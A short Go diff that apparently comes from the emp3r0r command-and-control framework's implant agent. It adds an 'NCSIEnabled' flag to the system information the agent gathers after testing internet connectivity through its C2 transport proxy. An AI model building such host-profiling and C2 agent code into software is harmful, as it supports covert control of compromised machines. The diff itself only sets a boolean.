@@ -131,8 +131,10 @@ func CollectSystemInfo() *emp3r0r_data.AgentSystemInfo {
 	// has internet?
 	if !RuntimeConfig.DisableNCSI {
 		info.HasInternet = tun.TestConnectivity(tun.UbuntuConnectivityURL, RuntimeConfig.C2TransportProxy)
+		info.NCSIEnabled = true
 	} else {
 		info.HasInternet = false
+		info.NCSIEnabled = false
 	}
 
 	// IP address?
